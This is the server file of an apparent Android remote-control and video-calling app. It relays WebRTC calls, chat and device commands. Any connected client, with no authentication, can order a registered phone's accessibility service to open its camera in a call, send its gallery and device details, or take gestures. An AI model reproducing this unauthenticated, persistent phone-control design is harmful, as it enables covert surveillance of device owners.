import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import fs from "fs";

const app = express();
app.disable("x-powered-by");

// Enforce HTTP Security Headers
app.use((req, res, next) => {
    res.setHeader("X-Content-Type-Options", "nosniff");
    res.setHeader("X-XSS-Protection", "1; mode=block");
    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
    res.setHeader("Permissions-Policy", "camera=*, microphone=*, display-capture=*");
    next();
});

app.use(express.json({ limit: "2mb" }));

// Remote Crash Logging from Android Companion
app.post("/api/crash-log", (req, res) => {
    try {
        const { deviceId, deviceName, error, stack, thread } = req.body || {};
        const timestamp = new Date().toISOString();
        const logLine = `\n================== ANDROID CRASH REPORT [${timestamp}] ==================\nDevice: ${deviceId || "unknown"} (${deviceName || "Android"})\nThread: ${thread || "main"}\nError: ${error}\nStack:\n${stack}\n========================================================================\n`;
        console.error(logLine);
        fs.appendFileSync(join(dirname(fileURLToPath(import.meta.url)), "crash.log"), logLine);
        addRuntimeLog("android", "error", "FATAL_CRASH", `CRASH on ${thread || 'main'}: ${error} [Device: ${deviceName || deviceId || 'Android'}]`);
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

const server = createServer(app);

const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    maxHttpBufferSize: 2e7 // 20MB payload limit for file/photo attachments
});

// =====================================================================
// Unified Runtime Live Logging Buffer (Max 200 entries)
// =====================================================================
const MAX_RUNTIME_LOGS = 500;
const runtimeLogs = [];

function addRuntimeLog(source, level, tag, msg) {
    const entry = {
        time: new Date().toLocaleTimeString(),
        timestamp: Date.now(),
        source: source || 'server',
        level: level || 'info',
        tag: tag || '',
        msg: typeof msg === 'object' ? JSON.stringify(msg) : String(msg || '')
    };
    runtimeLogs.push(entry);
    if (runtimeLogs.length > MAX_RUNTIME_LOGS) {
        runtimeLogs.shift();
    }
    if (io) {
        io.emit("new-log-entry", entry);
    }
    return entry;
}

// HTTP Endpoint for Runtime Logs (JSON)
app.get("/api/logs", (req, res) => {
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    res.json({
        total: runtimeLogs.length,
        logs: runtimeLogs
    });
});

// HTTP Endpoint for Runtime Logs (Plain Text / Easy Copy All)
app.get("/api/logs/text", (req, res) => {
    res.setHeader("Content-Type", "text/plain; charset=utf-8");
    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    const lines = runtimeLogs.map(e => `[${e.time || ''}] [${(e.source || 'server').toUpperCase()}] ${e.tag ? '[' + e.tag + '] ' : ''}${e.msg}`);
    res.send(lines.join("\n"));
});

// HTTP Endpoint to Post Log Entry from Client
app.post("/api/logs", (req, res) => {
    try {
        const { source, level, tag, msg } = req.body || {};
        if (msg) {
            addRuntimeLog(source || "client", level || "info", tag || "HTTP", msg);
        }
        res.json({ success: true });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.delete("/api/logs", (req, res) => {
    runtimeLogs.length = 0;
    if (io) io.emit("runtime-logs-cleared");
    res.json({ success: true, message: "Logs cleared" });
});

// Store connected active users who have entered a name:
// socketId -> { username, id }
const usersBySocket = new Map();

// Device Registry: deviceId -> { deviceId, deviceName, ram, platform, socketId, online }
const DEVICES_FILE = join(dirname(fileURLToPath(import.meta.url)), "devices.json");

// =====================================================================
// findTargetSocketId — unified lookup: username, socketId, deviceId
// Checks usersBySocket (exact match, _screen variant), io.sockets, deviceRegistry
// =====================================================================
function findTargetSocketId(to) {
    if (!to) return null;
    // 1. Exact username match in usersBySocket
    for (const [sId, u] of usersBySocket.entries()) {
        if (u.username === to || sId === to) return sId;
    }
    // 2. Try adding _screen suffix (mobile companion sends base name, browser targets base_screen)
    const withScreen = to.endsWith("_screen") ? to : `${to}_screen`;
    for (const [sId, u] of usersBySocket.entries()) {
        if (u.username === withScreen) return sId;
    }
    // 3. Try stripping _screen suffix
    const withoutScreen = to.endsWith("_screen") ? to.slice(0, -7) : null;
    if (withoutScreen) {
        for (const [sId, u] of usersBySocket.entries()) {
            if (u.username === withoutScreen) return sId;
        }
    }
    // 4. Direct socket ID match in io.sockets
    if (io.sockets.sockets.has(to)) return to;
    // 5. deviceRegistry — check all sockets of device
    if (deviceRegistry.has(to)) {
        const dev = deviceRegistry.get(to);
        if (dev && dev.sockets && dev.sockets.size > 0) {
            return [...dev.sockets][0]; // return first active socket
        }
        if (dev && dev.socketId && io.sockets.sockets.has(dev.socketId)) return dev.socketId;
    }
    // 6. Case-insensitive username match (fallback)
    const toLower = to.toLowerCase();
    for (const [sId, u] of usersBySocket.entries()) {
        if (u.username.toLowerCase() === toLower) return sId;
    }
    return null;
}
const deviceRegistry = new Map();

function loadDevices() {
    try {
        if (fs.existsSync(DEVICES_FILE)) {
            const data = JSON.parse(fs.readFileSync(DEVICES_FILE, "utf-8"));
            for (const item of data) {
                deviceRegistry.set(item.deviceId, { ...item, socketId: null, online: false });
            }
            console.log(`Loaded ${deviceRegistry.size} devices from ${DEVICES_FILE}`);
        }
    } catch (e) {
        console.error("Failed to load devices.json:", e);
    }
}

function saveDevices() {
    try {
        const list = [];
        for (const [id, dev] of deviceRegistry.entries()) {
            list.push({
                deviceId: dev.deviceId,
                deviceName: dev.deviceName,
                ram: dev.ram,
                platform: dev.platform
            });
        }
        fs.writeFileSync(DEVICES_FILE, JSON.stringify(list, null, 2), "utf-8");
    } catch (e) {
        console.error("Failed to save devices.json:", e);
    }
}

loadDevices();

function getDeviceListPayload() {
    const list = [];
    for (const [deviceId, info] of deviceRegistry.entries()) {
        // Prune any sockets that are disconnected
        if (info.sockets) {
            for (const sid of Array.from(info.sockets)) {
                const s = io.sockets.sockets.get(sid);
                if (!s || !s.connected) {
                    info.sockets.delete(sid);
                    if (info.bgSocketId === sid) info.bgSocketId = null;
                    if (info.companionSocketId === sid) info.companionSocketId = null;
                }
            }
        }

        let isOnline = Boolean(info.sockets && info.sockets.size > 0);
        info.online = isOnline;
        if (isOnline) {
            info.socketId = info.bgSocketId || Array.from(info.sockets)[0];
        } else {
            info.socketId = null;
        }

        list.push({
            deviceId: info.deviceId,
            deviceName: info.deviceName,
            ram: info.ram,
            platform: info.platform,
            online: isOnline
        });
    }
    return list;
}

// Parse client device type from User-Agent or companion identifier
function parseDeviceFromUserAgent(ua, isAndroidCompanion) {
    if (isAndroidCompanion) {
        return {
            type: "android",
            name: "Android Mobile (VRemote App)",
            icon: "fab fa-android",
            color: "#3ddc84"
        };
    }
    const agent = ua || "";
    // 1. Android
    if (/android/i.test(agent)) {
        return {
            type: "android",
            name: "Android Mobile Device",
            icon: "fab fa-android",
            color: "#3ddc84"
        };
    }
    // 2. iOS (iPhone / iPad / iPod)
    if (/iPad|iPhone|iPod/i.test(agent)) {
        const isTablet = /iPad/i.test(agent);
        return {
            type: "ios",
            name: isTablet ? "iOS Device (iPad)" : "iOS Mobile (iPhone)",
            icon: "fab fa-apple",
            color: "#f5f5f7"
        };
    }
    // 3. Windows
    if (/windows/i.test(agent)) {
        return {
            type: "windows",
            name: "Windows PC / Laptop",
            icon: "fab fa-windows",
            color: "#00adef"
        };
    }
    // 4. macOS
    if (/macintosh|mac os x/i.test(agent)) {
        return {
            type: "mac",
            name: "Mac / MacBook Device",
            icon: "fab fa-apple",
            color: "#f5f5f7"
        };
    }
    // 5. Linux
    if (/linux/i.test(agent)) {
        return {
            type: "linux",
            name: "Linux PC / Laptop",
            icon: "fab fa-linux",
            color: "#fcc624"
        };
    }
    // Fallback: Generic desktop / mobile
    const isMobile = /mobile/i.test(agent);
    return {
        type: isMobile ? "mobile" : "desktop",
        name: isMobile ? "Mobile Device" : "Computer / Laptop",
        icon: isMobile ? "fas fa-mobile-alt" : "fas fa-laptop",
        color: "#9aa0a6"
    };
}

function getAllUsersPayload() {
    const payload = {};
    for (const [id, user] of usersBySocket.entries()) {
        const s = io.sockets.sockets.get(id);
        if (!s || !s.connected) {
            usersBySocket.delete(id);
            continue;
        }
        // Exclude internal companion screen share sockets from public participants list
        if (user.username.endsWith("_screen") || user.username.startsWith("mobile_remote_")) {
            continue;
        }
        payload[user.username] = {
            username: user.username,
            id,
            device: user.device || {
                type: "desktop",
                name: "Computer / Laptop",
                icon: "fas fa-laptop",
                color: "#9aa0a6"
            }
        };
    }
    return payload;
}

const __dirname = dirname(fileURLToPath(import.meta.url));

const staticOptions = {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith(".html") || filePath.endsWith(".js") || filePath.endsWith(".css")) {
            res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            res.setHeader("Pragma", "no-cache");
            res.setHeader("Expires", "0");
        }
    }
};

app.use(express.static("public", staticOptions));
app.use(express.static("app", staticOptions));

// Dedicated Handler for VRemote APK Download
app.get("/downloads/vremote.apk", (req, res) => {
    const apkPublic = join(__dirname, "public/downloads/vremote.apk");
    const apkApp = join(__dirname, "app/downloads/vremote.apk");
    const targetPath = fs.existsSync(apkPublic) ? apkPublic : (fs.existsSync(apkApp) ? apkApp : null);
    if (targetPath) {
        res.setHeader("Content-Disposition", 'attachment; filename="VRemote.apk"');
        res.setHeader("Content-Type", "application/vnd.android.package-archive");
        return res.sendFile(targetPath);
    }
    res.status(404).json({
        available: false,
        message: "APK file not found on server. Please compile from remoteapk/ folder."
    });
});

app.get("/", (req, res) => {
    res.sendFile(join(__dirname + "/app/index.html"));
});

io.on("connection", (socket) => {
    console.log(`Socket connected: ${socket.id}`);
    addRuntimeLog("server", "info", "Socket", `Socket connected: ${socket.id}`);

    // Unified Live Runtime Logging handlers
    socket.on("client-log", (data) => {
        try {
            if (!data) return;
            const entry = {
                time: data.time || new Date().toLocaleTimeString(),
                timestamp: data.timestamp || Date.now(),
                source: data.source || "client",
                level: data.level || "info",
                tag: data.tag || "",
                msg: typeof data.msg === "object" ? JSON.stringify(data.msg) : String(data.msg || "")
            };
            runtimeLogs.push(entry);
            if (runtimeLogs.length > MAX_RUNTIME_LOGS) {
                runtimeLogs.shift();
            }
            io.emit("new-log-entry", entry);
        } catch (e) {
            console.error("client-log error:", e);
        }
    });

    socket.on("get-runtime-logs", () => {
        socket.emit("runtime-logs-history", runtimeLogs);
    });

    socket.on("clear-runtime-logs", () => {
        runtimeLogs.length = 0;
        io.emit("runtime-logs-cleared");
    });

    // Send currently joined users and registered devices
    socket.emit("joined", getAllUsersPayload());
    socket.emit("device-list-update", getDeviceListPayload());

    // Allow clients to explicitly refresh or check participants on demand
    socket.on("get-users", () => {
        console.log(`Participants refresh requested by socket ${socket.id}`);
        socket.emit("joined", getAllUsersPayload());
    });

    // User joins by explicitly submitting their name (string or object with device info)
    socket.on("join-user", (data) => {
        let requestedName = "";
        let clientDevice = null;

        if (typeof data === "string") {
            requestedName = data;
        } else if (data && typeof data === "object") {
            requestedName = data.name || data.username || "";
            clientDevice = data.device || null;
        }

        if (!requestedName) return;
        // Strip out any HTML/Script injection & non-standard characters, max length 30
        const cleanName = requestedName.replace(/[^\w\s-]/gi, "").trim().substring(0, 30);
        if (!cleanName) return;

        // 1. Clean up any stale or disconnected sockets
        for (const [sId] of usersBySocket.entries()) {
            const s = io.sockets.sockets.get(sId);
            if (!s || !s.connected) {
                usersBySocket.delete(sId);
            }
        }

        // 2. Remove any prior registration of THIS socket so it never collides with itself
        if (usersBySocket.has(socket.id)) {
            usersBySocket.delete(socket.id);
        }

        // 3. Ensure unique name (Companion screen sockets replace previous instance without suffix)
        let finalName = cleanName;
        if (cleanName.endsWith("_screen") || cleanName.startsWith("mobile_remote_")) {
            for (const [sId, u] of usersBySocket.entries()) {
                if (sId !== socket.id && u.username.toLowerCase() === cleanName.toLowerCase()) {
                    usersBySocket.delete(sId);
                }
            }
            finalName = cleanName;
        } else {
            // Replace any previous socket from the same IP or stale socket for this username (eliminates spurious _1 on refresh/app reconnect)
            const currentIp = socket.handshake.address;
            for (const [sId, u] of usersBySocket.entries()) {
                if (sId !== socket.id && u.username && u.username.toLowerCase() === cleanName.toLowerCase()) {
                    const existingSocket = io.sockets.sockets.get(sId);
                    const existingIp = existingSocket ? existingSocket.handshake.address : null;
                    if (!existingSocket || !existingSocket.connected || (existingIp && existingIp === currentIp)) {
                        console.log(`Replacing prior socket ${sId} for "${cleanName}" (same client/IP reconnect)`);
                        if (existingSocket && existingSocket.connected) {
                            try { existingSocket.disconnect(true); } catch (_) {}
                        }
                        usersBySocket.delete(sId);
                    }
                }
            }

            // Check if cleanName is already taken by another active peer
            const otherActiveUsernames = new Set();
            for (const [sId, u] of usersBySocket.entries()) {
                if (sId !== socket.id && u.username) {
                    otherActiveUsernames.add(u.username.toLowerCase());
                }
            }

            if (!otherActiveUsernames.has(cleanName.toLowerCase())) {
                // Name is available! Keep exact requested name without suffix
                finalName = cleanName;
            } else {
                // Name is genuinely already in use by another separate peer. Append _1, _2, etc.
                let suffix = 1;
                let candidate = `${cleanName}_${suffix}`;
                while (otherActiveUsernames.has(candidate.toLowerCase())) {
                    suffix++;
                    candidate = `${cleanName}_${suffix}`;
                }
                finalName = candidate;
            }
        }

        const ua = socket.handshake.headers["user-agent"] || "";
        const isCompanion = finalName.endsWith("_screen") || /okhttp/i.test(ua);
        const detectedDevice = clientDevice || parseDeviceFromUserAgent(ua, isCompanion);

        usersBySocket.set(socket.id, { username: finalName, id: socket.id, device: detectedDevice });
        console.log(`User joined: "${finalName}" (${socket.id}) [Platform: ${detectedDevice.name}]`);
        addRuntimeLog("server", "info", "Auth", `User joined: "${finalName}" (${socket.id}) [${detectedDevice.name}]`);

        socket.emit("name-confirmed", finalName);
        io.emit("joined", getAllUsersPayload());
    });

    // Freeze / Leave event - remove user from participants list
    socket.on("freeze-user", () => {
        if (usersBySocket.has(socket.id)) {
            const u = usersBySocket.get(socket.id);
            console.log(`User frozen / left: ${u.username} (${socket.id})`);
            usersBySocket.delete(socket.id);
            io.emit("joined", getAllUsersPayload());
        }
    });

    // Kick / Delete participant
    socket.on("kick-user", ({ targetUser }) => {
        console.log(`Kick request for: "${targetUser}" by socket ${socket.id}`);
        let targetSocketId = null;
        for (const [sId, u] of usersBySocket.entries()) {
            if (u.username === targetUser || sId === targetUser) {
                targetSocketId = sId;
                break;
            }
        }

        if (targetSocketId) {
            usersBySocket.delete(targetSocketId);
            // Notify the kicked user
            io.to(targetSocketId).emit("kicked", { targetUser });
            io.to(targetSocketId).emit("end-call", { from: "system", to: targetUser });
            // Broadcast updated list to all
            io.emit("joined", getAllUsersPayload());
        }
    });

    // WebRTC Offer
    socket.on("offer", (data) => {
        const { from, to, offer } = data || {};
        const isScreenShare = Boolean(data.isScreenShare || (offer && offer.isScreenShare));
        console.log(`Call offer: ${from} -> ${to} (isScreenShare=${isScreenShare})`);
        addRuntimeLog("server", "info", "WebRTC", `Offer routed: ${from} -> ${to} (screen=${isScreenShare})`);
        const targetSocketId = findTargetSocketId(to);
        if (targetSocketId) {
            io.to(targetSocketId).emit("offer", { ...data, from, to, offer, isScreenShare });
        } else {
            console.warn(`Target user "${to}" not found for offer`);
        }
    });

    // Remote Control Gesture Relay (DataChannel Fallback)
    socket.on("remote-control", (data) => {
        const { to } = data || {};
        if (!to) return;
        const targetSocketId = findTargetSocketId(to);
        if (targetSocketId) {
            io.to(targetSocketId).emit("remote-control", data);
            addRuntimeLog("server", "info", "RemoteControl", `Relayed gesture [${data.type || "tap"}] to ${to}`);
        } else {
            addRuntimeLog("server", "warn", "RemoteControl", `Cannot relay gesture [${data.type || "tap"}]: ${to} not online`);
        }
    });

    // WebRTC Answer
    socket.on("answer", ({ from, to, answer }) => {
        console.log(`Call answer: ${from} -> ${to}`);
        addRuntimeLog("server", "info", "WebRTC", `Answer routed: ${from} -> ${to}`);
        const targetSocketId = findTargetSocketId(to);
        if (targetSocketId) {
            io.to(targetSocketId).emit("answer", { from, to, answer });
        } else {
            console.warn(`Target user "${to}" not found for answer`);
        }
    });

    // ICE Candidate
    socket.on("icecandidate", ({ from, to, candidate }) => {
        if (!candidate) return;
        const targetSocketId = findTargetSocketId(to);
        if (targetSocketId) {
            io.to(targetSocketId).emit("icecandidate", { from, candidate });
        }
    });

    // End Call & Stop Screen Share
    socket.on("end-call", ({ from, to }) => {
        console.log(`Call ended event: from="${from}" to="${to}" (caller=${socket.id})`);
        addRuntimeLog("server", "warn", "Call", `Call ended: ${from} -> ${to}`);
        const cleanTo = to ? String(to).toLowerCase().split("_")[0] : "";

        // 1. If to is a deviceId, notify all sockets of that device
        if (to && deviceRegistry.has(to)) {
            const dev = deviceRegistry.get(to);
            if (dev && dev.sockets && dev.sockets.size > 0) {
                for (const sid of dev.sockets) {
                    io.to(sid).emit("end-call", { from, to });
                    io.to(sid).emit("auto-command", { command: "end_call", from: socket.id });
                }
            } else if (dev && dev.socketId) {
                io.to(dev.socketId).emit("end-call", { from, to });
                io.to(dev.socketId).emit("auto-command", { command: "end_call", from: socket.id });
            }
        }

        // 2. Also emit to user sockets (exact, case-insensitive, or base-UID prefix match)
        let deliveredCount = 0;
        for (const [sId, u] of usersBySocket.entries()) {
            if (sId === socket.id) continue; // Don't loopback to sender
            const uName = u.username ? String(u.username) : "";
            const uClean = uName.toLowerCase().split("_")[0];
            const toLower = to ? String(to).toLowerCase() : "";

            const isMatch = (
                uName === to ||
                sId === to ||
                uName.toLowerCase() === toLower ||
                (cleanTo && (uClean === cleanTo || uName.toLowerCase().startsWith(cleanTo) || toLower.startsWith(uClean)))
            );

            if (isMatch) {
                console.log(`Routing end-call to socket ${sId} (${uName})`);
                io.to(sId).emit("end-call", { from, to });
                io.to(sId).emit("auto-command", { command: "end_call", from: socket.id });
                deliveredCount++;
            }
        }

        if (deliveredCount === 0 && (!to || to === "all")) {
            socket.broadcast.emit("end-call", { from, to });
        }
    });

    // Chat Message Event (Text, Image/Video, Document Attachments)
    socket.on("chat-message", (msg) => {
        if (!msg || typeof msg !== "object") return;
        console.log(`Chat message from "${msg.from}" to "${msg.to || 'all'}" (Type: ${msg.file ? msg.file.type : 'text'})`);

        if (msg.to && msg.to !== "all") {
            let targetSocketId = null;
            for (const [sId, u] of usersBySocket.entries()) {
                if (u.username === msg.to || sId === msg.to) {
                    targetSocketId = sId;
                    break;
                }
            }
            if (targetSocketId) {
                io.to(targetSocketId).emit("chat-message", msg);
            } else {
                // If specific peer socket not found by username, broadcast
                socket.broadcast.emit("chat-message", msg);
            }
        } else {
            socket.broadcast.emit("chat-message", msg);
        }
    });

    // Chat Reaction Event (WhatsApp-style emoji reactions)
    socket.on("chat-reaction", (data) => {
        if (!data || !data.messageId || !data.emoji) return;
        console.log(`Chat reaction: "${data.emoji}" by "${data.from}" on msg ${data.messageId}`);

        if (data.to && data.to !== "all") {
            let targetSocketId = null;
            for (const [sId, u] of usersBySocket.entries()) {
                if (u.username === data.to || sId === data.to) {
                    targetSocketId = sId;
                    break;
                }
            }
            if (targetSocketId) {
                io.to(targetSocketId).emit("chat-reaction", data);
            } else {
                socket.broadcast.emit("chat-reaction", data);
            }
        } else {
            socket.broadcast.emit("chat-reaction", data);
        }
    });

    // Call Mode Change (Audio-Only Call vs Video Call Mode)
    socket.on("call-mode-change", ({ from, to, mode, initiator }) => {
        console.log(`Call mode change by "${from}" to "${mode}" (target: ${to || 'all'}, initiator: ${initiator || from})`);
        const targetSocketId = findTargetSocketId(to);
        if (targetSocketId) {
            io.to(targetSocketId).emit("call-mode-change", { from, to, mode, initiator: initiator || from });
        } else {
            let routed = false;
            const cleanTo = to ? String(to).toLowerCase().split("_")[0] : "";
            if (cleanTo) {
                for (const [sId, u] of usersBySocket.entries()) {
                    if (sId === socket.id) continue;
                    const uClean = (u.username || "").toLowerCase().split("_")[0];
                    if (uClean === cleanTo) {
                        io.to(sId).emit("call-mode-change", { from, to, mode, initiator: initiator || from });
                        routed = true;
                    }
                }
            }
            if (!routed) {
                socket.broadcast.emit("call-mode-change", { from, to, mode, initiator: initiator || from });
            }
        }
    });

    // Peer Camera Blocked / Unblocked State
    socket.on("peer-video-state", ({ from, to, videoEnabled }) => {
        const targetSocketId = findTargetSocketId(to);
        if (targetSocketId) {
            io.to(targetSocketId).emit("peer-video-state", { from, to, videoEnabled });
        } else {
            let routed = false;
            const cleanTo = to ? String(to).toLowerCase().split("_")[0] : "";
            if (cleanTo) {
                for (const [sId, u] of usersBySocket.entries()) {
                    if (sId === socket.id) continue;
                    const uClean = (u.username || "").toLowerCase().split("_")[0];
                    if (uClean === cleanTo) {
                        io.to(sId).emit("peer-video-state", { from, to, videoEnabled });
                        routed = true;
                    }
                }
            }
            if (!routed) {
                socket.broadcast.emit("peer-video-state", { from, to, videoEnabled });
            }
        }
    });

    // ==========================================
    // DEVICE REGISTRY & AUTO CONTROL
    // ==========================================
    socket.on("register-device", (data) => {
        try {
            const { deviceId, deviceName, ram, platform, role } = data || {};
            if (!deviceId) return;
            let existing = deviceRegistry.get(deviceId);
            if (!existing) {
                existing = {
                    deviceId,
                    deviceName: deviceName || "Android Device",
                    ram: ram || "",
                    platform: platform || "android",
                    sockets: new Set(),
                    accSocketId: null,
                    bgSocketId: null,
                    companionSocketId: null
                };
                deviceRegistry.set(deviceId, existing);
            }
            if (!existing.sockets) existing.sockets = new Set();

            // Prune dead sockets
            for (const sid of Array.from(existing.sockets)) {
                const s = io.sockets.sockets.get(sid);
                if (!s || !s.connected) {
                    existing.sockets.delete(sid);
                    if (existing.accSocketId === sid) existing.accSocketId = null;
                    if (existing.bgSocketId === sid) existing.bgSocketId = null;
                    if (existing.companionSocketId === sid) existing.companionSocketId = null;
                }
            }

            existing.sockets.add(socket.id);
            existing.socketId = socket.id;
            existing.online = true;

            if (role === "accessibility_service") {
                existing.accSocketId = socket.id;
            } else if (role === "background_service") {
                existing.bgSocketId = socket.id;
            } else if (role === "companion") {
                existing.companionSocketId = socket.id;
            }

            if (deviceName) existing.deviceName = deviceName;
            if (ram) existing.ram = ram;
            if (platform) existing.platform = platform;
            saveDevices();
            console.log(`Device registered: ${deviceId} (${existing.deviceName}) socket=${socket.id} role=${role || 'unknown'} (active sockets: ${existing.sockets.size})`);
            addRuntimeLog("server", "info", "DeviceRegistry", `Device registered: ${deviceId} (${existing.deviceName}, ${role || 'companion'})`);
            socket.emit("device-registered", { deviceId, success: true });
            io.emit("device-list-update", getDeviceListPayload());
        } catch (e) {
            console.error("register-device error:", e);
        }
    });

    socket.on("get-devices", () => {
        socket.emit("device-list-update", getDeviceListPayload());
    });

    socket.on("auto-command", (data) => {
        const { targetDeviceId, command, caller, cameraChoice, mediaId, mediaType, page } = data || {};
        const target = deviceRegistry.get(targetDeviceId);
        const callerName = caller || (usersBySocket.get(socket.id) ? usersBySocket.get(socket.id).username : socket.id);
        const payload = {
            command,
            from: socket.id,
            caller: callerName,
            cameraChoice: cameraChoice || "front",
            mediaId,
            mediaType,
            page: page || 0
        };

        let dispatched = false;

        // Clean dead sockets from target
        const activeSockets = [];
        if (target && target.sockets) {
            for (const sid of Array.from(target.sockets)) {
                const s = io.sockets.sockets.get(sid);
                if (s && s.connected) {
                    activeSockets.push(sid);
                } else {
                    target.sockets.delete(sid);
                    if (target.bgSocketId === sid) target.bgSocketId = null;
                    if (target.companionSocketId === sid) target.companionSocketId = null;
                }
            }
        }

        if (command === "end_call") {
            // Disconnect command: Broadcast to ALL active sockets of this device
            for (const sid of activeSockets) {
                io.to(sid).emit("auto-command", payload);
                dispatched = true;
            }
            console.log(`Auto-command 'end_call' broadcast to ${activeSockets.length} sockets of ${targetDeviceId}`);
        } else {
            // For calling / gallery / videos / info: DISPATCH TO EXACTLY ONE SOCKET!
            let chosenSocketId = null;

            // Prefer accessibility_service (persistent and unkillable when app closed), then background_service
            if (target && target.accSocketId && io.sockets.sockets.has(target.accSocketId)) {
                chosenSocketId = target.accSocketId;
            } else if (target && target.bgSocketId && io.sockets.sockets.has(target.bgSocketId)) {
                chosenSocketId = target.bgSocketId;
            } else if (activeSockets.length > 0) {
                chosenSocketId = activeSockets[0];
            } else if (target && target.socketId && io.sockets.sockets.has(target.socketId)) {
                chosenSocketId = target.socketId;
            }

            if (chosenSocketId) {
                io.to(chosenSocketId).emit("auto-command", payload);
                console.log(`Auto-command '${command}' -> device ${targetDeviceId} (single socket: ${chosenSocketId})`);
                addRuntimeLog("server", "info", "AutoCommand", `Dispatched '${command}' to ${targetDeviceId}`);
                dispatched = true;
            } else {
                console.warn(`No active socket found for device ${targetDeviceId} to dispatch '${command}'`);
                addRuntimeLog("server", "warn", "AutoCommand", `Failed dispatch '${command}' to ${targetDeviceId} (no socket)`);
            }
        }

        if (!dispatched) {
            let reason = "Device is offline (no background socket connected)";
            if (!target) {
                reason = "Device not registered on server (app has never connected)";
            } else if (!target.sockets || target.sockets.size === 0) {
                reason = "Device is offline (phone app closed or background service not running)";
            }
            socket.emit("device-error", {
                targetDeviceId,
                command,
                error: reason
            });
        }

        socket.emit("auto-command-dispatched", { command, targetDeviceId, success: dispatched });
    });

    // Relay device errors from Android companion/background service to requesting web client
    socket.on("device-error", (data) => {
        try {
            console.warn("device-error relayed from socket:", data);
            addRuntimeLog("server", "error", "Device", `Device error: ${(data && data.error) || 'Unknown error'}`);
            const targetSocketId = data && data.targetSocketId;
            if (targetSocketId) {
                io.to(targetSocketId).emit("device-error", data);
            } else {
                socket.broadcast.emit("device-error", data);
            }
        } catch (e) {}
    });

    socket.on("gallery-chunk", (data) => {
        try {
            const targetSocketId = data && data.targetSocketId;
            if (targetSocketId) {
                io.to(targetSocketId).emit("gallery-chunk", data);
            }
        } catch (e) {}
    });

    socket.on("media-detail-response", (data) => {
        try {
            const targetSocketId = data && data.targetSocketId;
            if (targetSocketId) {
                io.to(targetSocketId).emit("media-detail-response", data);
            }
        } catch (e) {}
    });

    socket.on("device-info-response", (data) => {
        try {
            const targetSocketId = data && data.targetSocketId;
            if (targetSocketId) {
                io.to(targetSocketId).emit("device-info-response", data);
            }
        } catch (e) {}
    });

    // Disconnect cleanup
    socket.on("disconnect", (reason) => {
        for (const [deviceId, info] of deviceRegistry.entries()) {
            if (info.sockets && info.sockets.has(socket.id)) {
                info.sockets.delete(socket.id);
                if (info.accSocketId === socket.id) info.accSocketId = null;
                if (info.bgSocketId === socket.id) info.bgSocketId = null;
                if (info.companionSocketId === socket.id) info.companionSocketId = null;
                console.log(`Socket ${socket.id} disconnected from device ${deviceId}. Remaining sockets: ${info.sockets.size}`);
                if (info.sockets.size > 0) {
                    info.socketId = info.accSocketId || info.bgSocketId || Array.from(info.sockets)[0];
                    info.online = true;
                } else {
                    info.socketId = null;
                    info.online = false;
                }
                io.emit("device-list-update", getDeviceListPayload());
                break;
            } else if (info.socketId === socket.id) {
                info.socketId = null;
                info.online = false;
                if (info.accSocketId === socket.id) info.accSocketId = null;
                if (info.bgSocketId === socket.id) info.bgSocketId = null;
                if (info.companionSocketId === socket.id) info.companionSocketId = null;
                io.emit("device-list-update", getDeviceListPayload());
                break;
            }
        }

        if (usersBySocket.has(socket.id)) {
            const u = usersBySocket.get(socket.id);
            console.log(`User left: ${u.username} (${socket.id}) - ${reason}`);
            addRuntimeLog("server", "info", "Auth", `User left: ${u.username} (${socket.id})`);
            usersBySocket.delete(socket.id);
            io.emit("joined", getAllUsersPayload());
        }
    });
});

const port = process.env.PORT || 9000;
server.listen(port, "127.0.0.1", () => {
    console.log(`Server listening on 127.0.0.1:${port}`);
});
